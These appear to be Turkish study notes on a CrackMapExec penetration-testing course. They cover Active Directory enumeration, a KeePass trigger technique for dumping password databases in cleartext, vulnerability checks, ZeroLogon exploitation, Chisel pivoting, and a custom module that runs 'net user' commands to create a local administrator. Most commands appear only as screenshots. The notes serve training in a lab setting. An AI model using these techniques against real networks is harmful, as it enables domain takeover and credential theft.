+[MS-DS-Machine-AccountQuot](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)a özniteliği ile temsil edilen Machine Account Quota (MAQ), varsayılan olarak bir kullanıcının bir domain içinde oluşturmasına izin verilen bilgisayar hesaplarının sayısını gösteren domain düzeyinde bir özniteliktir.
+
+Domain'de bir makine oluşturmamızı gerektiren [Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution) gibi birkaç saldırı vardır ve bu nedenle hesap makinesi kotası özelliğini numaralandırmak çok önemlidir.
+
+
+### Machine Quota Module
+![Pasted image 20241203131107.png](/img/user/resimler/Pasted%20image%2020241203131107.png)
+
+
+### LDAP Module - daclread
+
+Bir başka harika modül ise bir veya birden fazla nesnenin DACL'lerini okumamızı ve dışa aktarmamızı sağlayan daclread'dir. Bu modül Active Directory erişimini numaralandırmamızı sağlayacaktır. Aşağıdaki seçeneklere sahiptir:
+
+
+### daclread Module Options
+
+![Pasted image 20241203131203.png](/img/user/resimler/Pasted%20image%2020241203131203.png)
+
+Diyelim ki grace hesabının tüm ACE'lerini okumak istiyoruz. TARGET seçeneğini ve ACTION read seçeneğini kullanabiliriz:
+
+
+### Grace Kullanıcısının DACL'sini Oku
+
+![Pasted image 20241203131236.png](/img/user/resimler/Pasted%20image%2020241203131236.png)
+![Pasted image 20241203131242.png](/img/user/resimler/Pasted%20image%2020241203131242.png)
+
+
+Hangi sorumluların DCSync haklarına sahip olduğu gibi belirli hakları da arayabiliriz. TARGET_DN seçeneğini kullanmamız ve ayırt edici alan adını (DN), okunan ACTION'ı ve RIGHTS seçeneği ile aramak istediğimiz hakları belirtmemiz gerekir.
+
+
+### Searching for Users with DCSync Rights
+![Pasted image 20241203131416.png](/img/user/resimler/Pasted%20image%2020241203131416.png)
+![Pasted image 20241203131423.png](/img/user/resimler/Pasted%20image%2020241203131423.png)
+![Pasted image 20241203131432.png](/img/user/resimler/Pasted%20image%2020241203131432.png)
+
+Çıktıda gösterildiği gibi, ACE[4] robert kullanıcısının hedef domain'de DCSync haklarına sahip olduğunu gösterir.
+
+LDAP'ta birkaç modül daha kullanabiliriz. Modüllerin tam listesini görmek için -L seçeneğini kullanabiliriz.
+
+### LDAP Protocol Modules
+
+![Pasted image 20241203131512.png](/img/user/resimler/Pasted%20image%2020241203131512.png)
+
+
+
+### SMB Protocol Modules
+SMB protokolünde daha fazla modül mevcuttur. CrackMapExec modülünde yaptığımız şeylerin çoğu SMB protokolünü kullanır. İlginç bilgiler elde etmemizi sağlayacak bazı modülleri gözden geçirelim.
+
+Not: SMB kullanan modüllerin çoğunun çalışması için yönetici haklarına ( Pwned! ) ihtiyaç vardır.
+
+
+### SMB Modülleri - get_netconnections ve ioxidresolver
+Bir ağ pentesti üzerinde çalışırken, sürekli olarak daha fazla kaynağa veya ağa erişim elde etmeye çalışırız. CrackMapExec, daha önce tehlikeye attığımız bir makineyi numaralandırmamıza ve birden fazla ağ yapılandırmasına sahip olup olmadığını belirlememize olanak tanıyan bazı modüllere sahiptir. get_netconnections ve ioxidresolver modüllerini kullanalım ve farklarını görelim.
+
+get_netconnections modülü, ağ bağlantılarını sorgulamak için WMI kullanır. IPv6 ve herhangi bir ikincil IP dahil olmak üzere tüm IP adreslerinin yanı sıra domain adını da alır.
+
+
+### get_netconnections Module
+![Pasted image 20241203142100.png](/img/user/resimler/Pasted%20image%2020241203142100.png)
+
+
+Öte yandan, ioxidresolver modülü IP adreslerini sorgulamak için RPC kullanır. Ancak, bu modül IPv6 adreslerini içermez.
+
+
+### ioxidresolver Module
+![Pasted image 20241203142142.png](/img/user/resimler/Pasted%20image%2020241203142142.png)
+![Pasted image 20241203142148.png](/img/user/resimler/Pasted%20image%2020241203142148.png)
+
+Not: İhtiyaçlarımıza en uygun olanı seçebilmemiz için bir modülün nasıl çalıştığını anlamak önemlidir.
+
+
+### SMB Module - keepass_discover
+
+KeePass, kurumsal ağlarda yöneticiler ve kullanıcılar tarafından parolaları ve gizli bilgileri tek bir veritabanında saklamak için yaygın olarak kullanılan ücretsiz, açık kaynaklı bir parola yöneticisidir. Bir ana parola onu korur. Bir KeePass veritabanı alırsak, onu açmak için şifresine ihtiyacımız vardır.
+
+### KeePass'i Keşfetme
+
+![Pasted image 20241203142341.png](/img/user/resimler/Pasted%20image%2020241203142341.png)
+
+Eğer ana parolaya sahip değilsek bir alternatif de Lee Christensen ( @tifkin_) ve Will Schroeder ( @harmj0y) tarafından geliştirilen ve veritabanını açık metin olarak dışa aktarmak için KeePass'ın tetikleme sistemini kullanan bir teknik kullanmaktır. KeePass yapılandırma dosyasını, veritabanını otomatik olarak açık metin olarak dışa aktaran bir [tetikleyici](https://keepass.info/help/v2/triggers.html) içerecek şekilde değiştirir.
+
+Bunu kullanmak için beş (5) adıma ihtiyacımız var:
+
+21. KeePass yapılandırma dosyasını bulun. Biz bunu keepass_discover modülü ile yaptık.
+22. ACTION=ADD seçeneğini ve KEEPASS_CONFIG_PATH öğesini kullanarak trigger'ı yapılandırma dosyasına ekleyin.
+
+### KeePass Yapılandırma Dosyasına Trigger Ekleme
+![Pasted image 20241203142642.png](/img/user/resimler/Pasted%20image%2020241203142642.png)
+Not: KeePass yapılandırma yolu için ters eğik çizgi (/) veya çift eğik çizgi (\) kullandığınızdan emin olun.
+
+Kullanıcının KeePass'i açmasını ve ana parolayı girmesini bekleyin. Bu işlemi zorlamak için ACTION=RESTART seçeneğini kullanarak KeePass.exe prosesini yeniden başlatabiliriz. Hedef makinede oturum açmış çok sayıda kullanıcı varsa, USER=julio gibi kullanıcı adı ile USER seçeneğini ekleyebiliriz.
+
+![Pasted image 20241203142812.png](/img/user/resimler/Pasted%20image%2020241203142812.png)
+
+ACTION=POLL seçeneğini kullanarak dışa aktarılan veritabanını makinemize sorgulayın. Daha sonra şifre girişlerini aramak için grep kullanabiliriz.
+
+
+### Ele Geçirilen Hedeften Dışa Aktarılan Verilerin Yoklanması
+![Pasted image 20241203142916.png](/img/user/resimler/Pasted%20image%2020241203142916.png)
+
+![Pasted image 20241203142924.png](/img/user/resimler/Pasted%20image%2020241203142924.png)
+
+ACTION=CLEAN seçeneğini ve KEEPASS_CONFIG_PATH'i kullanarak yapılandırma dosyasını temizleyin
+
+
+### Clean Configuration File Changes
+
+![Pasted image 20241203143132.png](/img/user/resimler/Pasted%20image%2020241203143132.png)
+![Pasted image 20241203143139.png](/img/user/resimler/Pasted%20image%2020241203143139.png)
+
+Bu modül için her bir seçeneği öğrendik, ancak ACTION=ALL ile hepsini bir kerede alabiliriz. Bu seçeneğin iyi yanı, .xml dosyasında herhangi bir parola girişi arayan ve bunu konsola yazdıran extract_password yöntemini içermesidir.
+
+
+### keeppass_trigger TÜMÜNÜ Tek Komutta Çalıştırma
+
+![Pasted image 20241203143219.png](/img/user/resimler/Pasted%20image%2020241203143219.png)
+![Pasted image 20241203143229.png](/img/user/resimler/Pasted%20image%2020241203143229.png)
+Not: Modül şifreyi yazdırırken sorun yaşayabilir. Bir hata alabiliriz, ancak şifre /tmp/export.xml dosyasında olacaktır, böylece manuel olarak alabiliriz.
+
+
+### RDP'yi Etkinleştirme veya Devre Dışı Bırakma
+Değerlendirme yaparken yapmak isteyebileceğimiz yaygın bir görev, RDP aracılığıyla bir hedef makineye bağlanmaktır. Bu, başka türlü yanal hareket saldırıları gerçekleştiremediğimiz veya standart bir protokol kullanarak radarın altından geçmek istediğimiz bazı senaryolarda yararlı olabilir.
+
+Bağlanmak istediğimiz makinede RDP etkin değilse, buna izin vermek için RDP modülünü kullanabiliriz. ACTION seçeneğini ve ardından enable veya disable seçeneklerini belirtmemiz gerekir.
+
+
+### RDP'yi Etkinleştirme
+![Pasted image 20241203143718.png](/img/user/resimler/Pasted%20image%2020241203143718.png)
+![Pasted image 20241203143723.png](/img/user/resimler/Pasted%20image%2020241203143723.png)
+
+SMB'de birkaç modül daha vardır. Modüllerin tam listesini görmek için -L seçeneğini kullanabiliriz.
+
+
+### SMB Protocol Modules
+![Pasted image 20241203143808.png](/img/user/resimler/Pasted%20image%2020241203143808.png)
+
+Bir sonraki bölümde, ZeroLogon gibi bilinen güvenlik açıklarından yararlanan diğer SMB modüllerine bakacağız
+
+
+### Vulnerability Scan Modules
+Sızma testi yaparken gerçekleştirdiğimiz günlük faaliyetlerden biri güvenlik açıklarını tespit etmeye çalışmaktır. Eğer herhangi birini bulabilirsek, exploitation işi basit olabilir.
+
+CrackMapExec, güvenlik açıklarını tespit etmemizi sağlayan bazı modüller içerir. Bu oturumda bunlardan bazılarını inceleyeceğiz.
+
+
+### Ortamın Kurulması
+Bu senaryoda, bir sunucuyu ele geçirdik ve yönetici kimlik bilgilerini elde ettik. Bu sunucunun iki ağ kartı var ve amacımız domainin saldırıya karşı savunmasız olup olmadığını belirlemek. Domainin IP adresi 172.16.10.3'tür.
+
+Alana erişim sağlamak için, CME ile Proxy Zincirleri bölümünde öğrendiklerimizi kullanacağız ve Chisel ile bir bağlantı kuracağız
+
+
+### Chisel'i Hedef Makineye Gönderme
+![Pasted image 20241203144114.png](/img/user/resimler/Pasted%20image%2020241203144114.png)
+
+
+### Saldırı Hostumuzda Chisel'ı Sunucu Olarak Çalıştırma
+![Pasted image 20241203144152.png](/img/user/resimler/Pasted%20image%2020241203144152.png)
+![Pasted image 20241203144157.png](/img/user/resimler/Pasted%20image%2020241203144157.png)
+
+
+### Chisel'ı Tehlikeye Düşmüş Cihazdan Saldırı Hostumuza Bağlama
+
+![Pasted image 20241203144219.png](/img/user/resimler/Pasted%20image%2020241203144219.png)
+
+
+### Vulnerability Scan Modules
+
+CrackMapExec'teki güvenlik açığı modüllerinin çoğu yalnızca kontrol edilir ve bu modülleri güvenlik açıklarından yararlanmak için kullanamayız. [ZeroLogon güvenlik açığı](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile başlayalım.
+
+
+### ZeroLogon
+Kimliği doğrulanmamış bir saldırgan, bir domain controller'a ağ erişimi ile[ ZeroLogon güvenlik açığından (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu güvenlik açığını kötüye kullanmak ve sonunda domain'in kontrolünü ele geçirmek için savunmasız bir Netlogon oturumu başlatması gerekir. Bir Domain Controller'a bağlanmak başarılı bir saldırı için tek ön koşul olduğundan, güvenlik açığı ciddidir.
+
+CrackMapExec, bir Domain Controller'ın ZeroLogon'a karşı savunmasız olup olmadığını tanımlayan zerologon adlı bir modül içerir.
+
+
+### ZeroLogon Güvenlik Açığı Kontrolü
+![Pasted image 20241203144642.png](/img/user/resimler/Pasted%20image%2020241203144642.png)
+
+
+### PetitPotam
+Güvenlik araştırmacısı Gilles Lionel kısa bir süre önce [PetitPotam](https://github.com/topotam/PetitPotam) adı verilen ve saldırganların sadece kurumsal ağ altyapısına erişim sağlayarak domain'i tehlikeye atmasına olanak tanıyan bir saldırı tekniğini ortaya çıkardı. Yöntem, sunulan herhangi bir sunucu hizmetine (örneğin bir Domain Controller) yönelik klasik bir NTLM relay saldırısıdır. Lionel ayrıca GitHub PetitPotam'da saldırganların domain'i ele geçirmek için bu özel saldırı tekniğini nasıl kullanabileceklerini gösteren bir kavram kanıtı kodu da yayınladı.
+
+CrackMapExec, bir Domain Controller'ın PetitPotam'a karşı savunmasız olup olmadığını tanımlayan petitpotam adlı bir modül içerir.
+
+
+### Petitpotam Güvenlik Açığı Kontrolü
+![Pasted image 20241203144823.png](/img/user/resimler/Pasted%20image%2020241203144823.png)
+
+
+### noPAC
+noPAC güvenlik açığının istismarı, normal bir domain kullanıcısının ayrıcalıklarının bir domain yöneticisine yükseltilmesine izin verdi. Kavram kanıtı (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayınlandı.
+
+CrackMapExec, bir domain controller'ın noPAC'a karşı savunmasız olup olmadığını tanımlayan nopac adlı bir modül içerir.
+
+
+### noPAC vulnerability check
+![Pasted image 20241203144947.png](/img/user/resimler/Pasted%20image%2020241203144947.png)
+![Pasted image 20241203144952.png](/img/user/resimler/Pasted%20image%2020241203144952.png)
+
+
+### DFSCoerce
+Filip Dragovic, DFSCoerce adlı bir NTLM relay saldırısı için bir kavram kanıtı ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayınladı. Yöntem, bir Windows domain'inin kontrolünü ele geçirmek için Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolünü ele geçiriyor.
+
+Bu saldırı bir domain kullanıcısı gerektirir ve bir DC'nin savunmasız olup olmadığını belirlemek için CrackMapExec modülü dfscoerce'yi kullanabiliriz. Bu güvenlik açığını kontrol etmek için Y3t4n0th3rP4ssw0rd şifresiyle carole.holmes hesabını kullanacağız.
+
+
+### DFSCoerce Vulnerability Check
+![Pasted image 20241203145115.png](/img/user/resimler/Pasted%20image%2020241203145115.png)
+
+
+### ShadowCoerce
+ShadowCoerce, güvenlik araştırmacısı Lionel Gilles tarafından 2021'in sonlarında PetitPotam saldırısını sergileyen bir sunumun sonunda keşfedildi ve ilk kez detaylandırıldı. Charlie Bromberg bir kavram kanıtı ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluşturdu.
+
+CrackMapExec modülü shadowcoerce kullanarak DC'nin bu saldırıya karşı savunmasız olup olmadığını kontrol etmek için carole.holmes hesabını kullanalım.
+
+
+### ShadowCoerce Vulnerability Check
+![Pasted image 20241203145402.png](/img/user/resimler/Pasted%20image%2020241203145402.png)
+![Pasted image 20241203145408.png](/img/user/resimler/Pasted%20image%2020241203145408.png)
+
+Güvenlik açığı tarama modüllerinin çoğu yazarı, bilgisayarın güvenlik açığı olup olmadığına dair bir mesaj eklememiştir, bu nedenle komut çalıştırıldıktan sonra hiçbir şey görmeyiz. Ancak, ( ./CrackMapExec/cme/modules/shadowcoerce.py) adresinde bulunan shadowcoerse modülünün kaynak kodunu kontrol edersek, yazarın ( logging.debug ) ile bazı hata ayıklama günlükleri eklediğini göreceğiz. CrackMapExec'i hata ayıklama modunda çalıştırırsak, bu günlükleri yazdıracaktır.
+
+CrackMapExec'i hata ayıklama modunda çalıştırmak için protokolden önce --verbose seçeneğini kullanabiliriz
+
+
+### shadowcoerce Modülünü Verbose Enabled ile Çalıştırma
+![Pasted image 20241203145516.png](/img/user/resimler/Pasted%20image%2020241203145516.png)
+![Pasted image 20241203145527.png](/img/user/resimler/Pasted%20image%2020241203145527.png)
+![Pasted image 20241203145547.png](/img/user/resimler/Pasted%20image%2020241203145547.png)
+![Pasted image 20241203145555.png](/img/user/resimler/Pasted%20image%2020241203145555.png)
+![Pasted image 20241203145602.png](/img/user/resimler/Pasted%20image%2020241203145602.png)
+
+DEBUG ile başlayan satırlar logging.debug'a karşılık gelir. Son satırlarda hedefin savunmasız olmadığını gösterdiğini görebiliriz.
+
+
+### MS17-010 (EternalBlue)
+MS17-010, diğer adıyla EternalBlue, Windows işletim sistemleri için Microsft tarafından 14 Mart 2017 tarihinde yayınlanan bir güvenlik yamasıdır. Yama, SMB hizmetindeki kritik bir kimliği doğrulanmamış uzaktan kod çalıştırma açığı içindir. Bu güvenlik açığı hakkında daha fazla bilgi edinmek için [Microsoft Güvenlik Bülteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.
+
+CrackMapExec, bir domain controller'ın MS17-010'a karşı savunmasız olup olmadığını belirleyen ms17-010 adlı bir modül içerir.
+
+
+### MS17-010 Vulnerability Check
+![Pasted image 20241203145753.png](/img/user/resimler/Pasted%20image%2020241203145753.png)
+
+
+### Güvenlik Açığından Yararlanma
+Birçok güvenlik açığı gördük. Onlardan birini istismar etmeye çalışalım: ZeroLogon. Modül tarafından sağlanan bağlantıya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalım:
+
+
+### Exploiting ZeroLogon
+
+![Pasted image 20241203145855.png](/img/user/resimler/Pasted%20image%2020241203145855.png)
+
+![Pasted image 20241203145911.png](/img/user/resimler/Pasted%20image%2020241203145911.png)
+![Pasted image 20241203145928.png](/img/user/resimler/Pasted%20image%2020241203145928.png)
+![Pasted image 20241203145952.png](/img/user/resimler/Pasted%20image%2020241203145952.png)
+
+Diğer güvenlik açıklarından da yararlanmayı deneyebiliriz, ancak yararlanmadan önce hedef makineyi sıfırlamamız gerekir.
+
+Zaman geçtikçe yeni güvenlik açıkları ortaya çıkacaktır ve bunlar sektör uzmanları veya bizim tarafımızdan CrackMapExec'e modül olarak eklenebilir. Bir sonraki bölümde, CrackMapExec için nasıl bir modül oluşturabileceğimizi göreceğiz.
+
+
+### Kendi CME Modülümüzü Oluşturmak
+Yazarlar ve topluluk tarafından oluşturulan birçok yerleşik CrackMapExec modülünü kullandık. Bu bölümde CrackMapExec için modülümüzü nasıl yapabileceğimizi keşfedeceğiz.
+
+
+### CrackMapExec'i Poetry ile derleyin
+Modülümüzü oluşturmadan önce, CrackMapExec projesinin nasıl derleneceğini bilmek çok önemlidir. Bu amaçla CME, projelerimizi oluştururken önerilen [Poetry](https://python-poetry.org/)'yi kullanır. Poetry kullanmıyorsanız, CrackMapExec'i çalıştırmak üzere Poetry kullanmaya başlamak için Kurulum ve Binaryler bölümüne bir göz atın
+
+Şimdi kodu en sevdiğimiz IDE ile açabiliriz. Bu bölümde [VSCode](https://code.visualstudio.com/) kullanacağız. VSCode'u [kurmak](https://code.visualstudio.com/download) için .deb dosyasını kendi web sitesinden indirmemiz gerekiyor. Doğrudan indirme bağlantısı [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).
+
+
+### VSCode'un Kurulması ve Çalıştırılması
+![Pasted image 20241203150414.png](/img/user/resimler/Pasted%20image%2020241203150414.png)
+
+Daha sonra açmak için kod yazabiliriz 
+
+![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)
+
+
+### Yeni Modülümüzü Oluşturun
+Modülümüzü oluşturalım. Yeni bir yönetici hesabı oluşturacak basit bir script oluşturacağız.
+23. ./CrackMapExec/cme/modules klasörü altında createadmin.py adında bir dosya oluşturun.
+24. Aşağıdaki kod örneğini dosyaya kopyalayın:
+
+![Pasted image 20241203150546.png](/img/user/resimler/Pasted%20image%2020241203150546.png)
+![Pasted image 20241203150551.png](/img/user/resimler/Pasted%20image%2020241203150551.png)
+
+25. Şimdi modülümüzü özelleştirelim.
+
+Bazı değişkenleri tanımlamamız gerekiyor:
+* name, modül adını nasıl çağıracağımızı belirtir. Bu durumda, createadmin dosya adını kullanacağız.
+* description modülün amacı için kısa bir açıklamadır. Biz bunu Yeni bir yönetici hesabı oluştur olarak ayarlayacağız.
+* supported_protocols, modülü kullanmak için desteklenen protokolün bir dizisidir. Biz sadece SMB kullanacağız.
+* opsec_safe, modülün çalıştırılmasının güvenli olduğu anlamına gelen bir True veya False değeridir.
+* multiple_hosts, bu modülü birden fazla hedefe karşı çalıştırabileceğimiz anlamına gelir.
+
+Ayrıca, modül için değişkenleri tanımlamak için kullanılan options() yöntemine de sahip olacağız. Bu durumda, USER ve PASS olmak üzere iki seçenek ekleyeceğiz. Her seçeneğin varsayılan değeri olabilir ya da olmayabilir. Bu yazara bağlıdır. USER için varsayılan değeri düz metin olarak ve PASS için varsayılan değeri HackTheBoxCME! . Ayrıca USER o PASS modül seçeneğinin boş olup olmadığını doğrulamak için bir kontrol ekledik. Eğer durum buysa, modülden çıkılacaktır.
+
+![Pasted image 20241203150803.png](/img/user/resimler/Pasted%20image%2020241203150803.png)
+![Pasted image 20241203150814.png](/img/user/resimler/Pasted%20image%2020241203150814.png)
+
+26. Daha sonra, on_admin_login() metodunu kullanarak yürütme ile çalışacağız. Bu metot değişkenlerimizi almaktan ve hedeflere istediğimiz herhangi bir görevi yürütmekten sorumludur. Çıktı olarak context.log.info ve context.log.highlight metotlarını kullanacağız (farklı renklere sahipler).
+
+Bu yürütme için, yöntemin connection.execute(command, True) komutunu kullanarak bir cmd.exe komutu çalıştıracağız. Komutumuz, yeni bir kullanıcı eklemek için net user username password /add /Y değeriyle ve kullanıcıyı administrators grubuna eklemek için net localgroup administrators username /add değeriyle command değişkenine kaydedilecektir.
+
+![Pasted image 20241203150911.png](/img/user/resimler/Pasted%20image%2020241203150911.png)
+![Pasted image 20241203150916.png](/img/user/resimler/Pasted%20image%2020241203150916.png)
+
+Son olarak, yeni modülümüz şu şekilde görünmelidir:
+![Pasted image 20241203150932.png](/img/user/resimler/Pasted%20image%2020241203150932.png)
+![Pasted image 20241203151010.png](/img/user/resimler/Pasted%20image%2020241203151010.png)
+![Pasted image 20241203151027.png](/img/user/resimler/Pasted%20image%2020241203151027.png)
+
+
+### Modülümüzü Çalıştırma
+Şimdi modülümüzü herhangi bir seçenekle veya herhangi bir seçenek olmadan çalıştırabiliriz. Önce varsayılan değerlerle çalıştırarak sonuçları görelim.
+
+
+### CME Modülümüzün Çalıştırılması createadmin
+![Pasted image 20241203151110.png](/img/user/resimler/Pasted%20image%2020241203151110.png)
+
+Daha sonra, hem kullanıcı adı hem de parola belirterek çalıştırabiliriz.
+
+![Pasted image 20241203151145.png](/img/user/resimler/Pasted%20image%2020241203151145.png)
+![Pasted image 20241203151149.png](/img/user/resimler/Pasted%20image%2020241203151149.png)
+
+İlk modülümüz çalışıyor, ancak çok daha iyi olabilir. Yürütmeyi iki komuta bölebilir ve kullanıcı zaten oluşturulmuşsa veya şifre politikalara uymuyorsa bir hata gösterebiliriz.
+
+Ayrıca context.log.highlight(p)'den değeri alabilir ve bir hata varsa farklı bir şey gösterebiliriz. Bu kodu geliştirmek için fikirleriniz nelerdir?
+
+Bir şeyleri yapmanın her zaman farklı yolları olacaktır. Bu modülde neleri değiştireceğinizi ve bunu nasıl daha iyi yapacağınızı keşfedin. Bu modülü daha da özelleştirmek, kendi modüllerinizi oluşturmaya başlamak için harika bir yerdir.
+
+
+### Diğer Yazarlardan Öğrenmek
+Artık yeni bir modül oluşturmanın temellerini öğrendiğimize göre, diğer modülleri keşfetmeli ve birkaç fikir edinmeliyiz.
+
+Örneğin, procdump.py modülü procdump.exe çalıştırılabilir dosyasını bir Base64 dizesi olarak kaydeder, ardından Base64 dizesini bir dosyaya dönüştürür ve hedef işletim sisteminde tutar. LSASS'ın işlem kimliğini almak için tasklist komutunu çalıştırır, bunu bir değişkene kaydeder ve işlem kimliğini procdump.exe'nin yürütülmesine bir argüman olarak geçirir.
+
+Başka bir örnek get_description.py . Bu modülü groupmembership modülünü oluşturmak için örnek olarak aldık. Bu modül, bir sorgu gerçekleştirmek ve memberOf özniteliğini almak için ihtiyaç duyduğumuz gibi, sonuçlarını bir LDAP sorgusuna dayalı olarak alır. Kodda bazı değişiklikler yaptık, yeni bir modül oluşturduk ve bir çekme isteği gönderdik. Çekme isteği kabul edildikten sonra tüm topluluk tarafından kullanılabilir olacaktır.
+
+Yeni modüller oluşturmak için MSSQL gibi diğer protokoller için başka örneklere de bakabiliriz.
+
+
+### Çekme İsteği Oluşturma
+CrackMapExec gibi bir proje topluluk tarafından canlı tutulur. Modülümüzün tüm topluluk tarafından kullanılabilir hale geleceği ve aracın kendisinin bir parçası olarak dahil edileceği bir çekme isteği ekleyerek projeye katkıda bulunabiliriz.
+
+Bir çekme isteği yapmak için [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kılavuzunu takip edebilir ve CrackMapExec'e katkıda bulunabiliriz.
+
+İlerleyen bölümlerde, CrackMapExec kullanımı için IPv6, Kerberos Kimlik Doğrulama ve CrackMapExec veritabanında uzmanlaşma gibi bazı bonus konuları tartışacağız.
+
+
+
+### Ek CME İşlevselliği
+CrackMapExec, çeşitli senaryolarda çok faydalı olacak başka yardımcı programlara da sahiptir. Bu bölümde, bunlardan üçünü inceleyeceğiz:
+
+* Audit (Denetim) modu
+* IPv6 desteği
+* Birden fazla cihaza saldırırken tamamlanma yüzdesi
+
+### Audit Mode
+
+5.3.0 sürümünde yeni bir mod eklendi: audit modu. Bu mod, şifreyi veya hash'i tercih ettiğimiz bir karakterle veya hatta en sevdiğimiz emoji ile değiştirir. Bu özellik, bir müşteri raporu yazarken ekran görüntüsünün bulanıklaşmasını önlemeye yardımcı olur.
+
+Audit modunu yapılandırmak için, varsayılan olarak ~/.cme/cme.conf adresinde bulunan yapılandırma dosyasını düzenlememiz ve audit_mode parametresini tercih ettiğimiz karakterle değiştirmemiz gerekir. Bu karakter, CrackMapExec çalıştırılırken parolanın veya hash'in yerini alacaktır. Bu örnek için # karakterini kullanacağız
+
+
+### Enabling Audit Mode
+
+![Pasted image 20241203151754.png](/img/user/resimler/Pasted%20image%2020241203151754.png)
+
+Şimdi çalıştırabilir ve parolanın çıktıda ######## ile değiştirildiğini görebiliriz.
+
+![Pasted image 20241203151816.png](/img/user/resimler/Pasted%20image%2020241203151816.png)
+
+Gördüğümüz gibi, çalıştırma sonucundaki parola # karakteri ile değiştirilir. Ancak, komut şifreyi gösterir. Bu gibi durumlarda, istenen komutu çalıştırmadan önce parolayı bir dosyaya kaydetmek idealdir.
+
+### Denetim Modu Dosyadaki Parola ile Etkinleştirildi
+![Pasted image 20241203151858.png](/img/user/resimler/Pasted%20image%2020241203151858.png)
+
+
+### IPv6 Support
+CrackMapExec'in bir diğer özelliği de IPv6 üzerinden iletişimi desteklemesidir. Çoğu kuruluş, kullanmasalar bile IPv6'yı varsayılan olarak etkinleştirmiştir ve IPv6'nın IPv4'e göre günlük düzeyinde daha az izlenmesi veya anlaşılması bile mümkündür. Bu da ağ saldırılarının gerçekleştirilmesi ve tespit edilmemesi için bir fırsat yaratmaktadır.
+
+Popüler modüller bölümünde gördüğümüz gibi CrackMapExec get_netconnections modülü ile bilgisayarların IPv6'sını tespit etmemizi sağlıyor. Bu modülü kullanalım ve ardından komutu IPv6 üzerinden çalıştırmayı deneyelim.
+
+
+### get_netconnections Modülünü Çalıştırma ve IPv6 Kullanma
+
+![Pasted image 20241203152004.png](/img/user/resimler/Pasted%20image%2020241203152004.png)
+![Pasted image 20241203152012.png](/img/user/resimler/Pasted%20image%2020241203152012.png)
+
+Şimdi IPv6 üzerinden hedefe erişelim.
+![Pasted image 20241203152032.png](/img/user/resimler/Pasted%20image%2020241203152032.png)
+![Pasted image 20241203152041.png](/img/user/resimler/Pasted%20image%2020241203152041.png)
+![Pasted image 20241203152051.png](/img/user/resimler/Pasted%20image%2020241203152051.png)
+
+
+
+### Tamamlanma Yüzdesi
+
+Artık bir tarama çalışırken enter tuşuna basabilirsiniz ve CME size tamamlanma yüzdesini ve taranacak kalan host sayısını verecektir. Bu modül laboratuvarında her seferinde bir host'a saldırıyoruz, ancak daha kapsamlı bir ağ bulduğunuzda, büyük olasılıkla bu özelliği kullanacaksınız. Şimdilik --shares seçeneğini çalıştıralım ve bitmeden önce enter tuşuna basalım.
+
+
+### Tamamlanma Yüzdesi
+![Pasted image 20241203152158.png](/img/user/resimler/Pasted%20image%2020241203152158.png)
+
+Aşağıdaki bölümde, Kerberos kimlik doğrulamasını ve CrackMapExec'in bu kimlik doğrulama yöntemi için içerdiği yeni değişiklikleri tartışacağız.
+
+
+### Kerberos Authentication
+
+Yazma sırasında CrackMapEec, SMB, LDAP ve MSSQL protokolleri için Kerberos Kimlik Doğrulamasını desteklemektedir. Kerberos Kimlik Doğrulamasını kullanmanın iki (2) yolu vardır:
+
+27. ccache dosyasını belirtmek için KRB5CCNAME env adını kullanma. Password Attacks academy modülündeki Pass the Ticket (PtT) from Linux bölümünde Linux'tan Kerberos kullanımı anlatılmaktadır
+28. CrackMapExec 5.4.0'dan başlayarak, artık Kerberos kimlik doğrulaması için bir biletle KRB5CCNAME ortam değişkenini kullanmamız gerekmiyor. Bir kullanıcı adı ve parola veya kullanıcı adı ve hash kullanabiliriz.
+
+Linux'ta Kerberos kimlik doğrulamasını kullanırken göz önünde bulundurulması gereken önemli bir unsur, saldırdığımız bilgisayarın domain ve hedef makinenin FQDN'sini çözümlemesi gerektiğidir. Dahili bir ağdaysak, bilgisayarımızı şirketin DNS'sine domain adı çözümlemeleri yapacak şekilde yapılandırabiliriz, ancak durum böyle değildir. DNS'i yapılandıramayız ve /etc/hosts dosyasına domain controller ve hedef makinemiz için FQDN'i manuel olarak eklememiz gerekecektir.
+
+
+### Setting Up the /etc/hosts File
+
+![Pasted image 20241203152738.png](/img/user/resimler/Pasted%20image%2020241203152738.png)
+
+![Pasted image 20241203152745.png](/img/user/resimler/Pasted%20image%2020241203152745.png)
+
+CrackMapExec'i Kerberos kimlik doğrulaması ile kullanmayı deneyelim.
+
+
+### Username and Password - Kerberos Authentication
+CrackMapExec'i -k veya --kerberos seçeneği olmadan bir kullanıcı adı ve parola veya kullanıcı adı ve hash ile kullandığımızda, NTLM kimlik doğrulaması gerçekleştiririz. Kerberos seçeneğini kullanırsak bunun yerine Kerberos kimlik doğrulamasını kullanabiliriz.
+
+### Kerberos Authentication
+![Pasted image 20241203152841.png](/img/user/resimler/Pasted%20image%2020241203152841.png)
+![Pasted image 20241203152849.png](/img/user/resimler/Pasted%20image%2020241203152849.png)
+
+
+
+### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama
+
